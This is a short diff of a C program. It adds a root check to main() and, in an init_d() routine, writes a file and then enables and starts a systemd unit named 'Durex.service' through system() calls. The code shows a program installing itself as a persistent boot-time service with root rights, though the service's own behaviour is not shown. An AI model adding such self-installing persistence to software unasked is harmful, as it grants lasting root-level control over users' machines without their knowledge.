@@ -88,18 +88,24 @@ static int init_d()
 	if (munmap(obj, obj_size) < 0)
 		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(init_fd);
-	// TODO reload init d
-	system("systemctl enable Durex.service");
-	system("systemctl start  Durex.service");
+	// reload systemd
+	system("systemctl enable Durex.service");// $1>/dev/null $2>/dev/null");
+	system("systemctl start  Durex.service");// $1>/dev/null $2>/dev/null");
 	return 0;
 }
 
 int main(void)
 {
-	// TODO check sudo
-	//
-	create_file();
-	init_d();
-	printf("eparisot\n");
+	// check sudo
+	if (getuid() == 0)
+	{
+		create_file();
+		init_d();
+		printf("eparisot\n");
+	}
+	else
+	{
+		(DEBUG) ? printf("Insufficient Permissions, please re-run as root.\n") : 0;
+	}
 	return 0;
 }
